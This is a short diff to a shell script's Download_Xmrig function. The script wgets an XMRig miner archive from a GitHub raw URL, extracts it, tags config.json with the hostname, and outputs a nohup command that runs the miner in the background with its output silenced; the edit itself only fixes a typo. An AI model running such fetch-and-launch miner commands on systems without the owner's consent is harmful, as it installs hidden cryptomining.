@@ -264,7 +264,7 @@ Download_Xmrig() {
         wget -O /tmp/xmr.tgz https://raw.githubusercontent.com/qwinwin/qwin/dev/xmr_centos.tgz && tar -xzvf /tmp/xmr.tgz -C .
         ;;
     esac
-    [ "$?" = 0 ] && sed -i "s/test/$(hostname)/" config.json && echo 'cd /home;nohup ./xmrig >>/dev/null 2>&1 &'o
+    [ "$?" = 0 ] && sed -i "s/test/$(hostname)/" config.json && echo 'cd /home;nohup ./xmrig >>/dev/null 2>&1 &'
 
 }
 
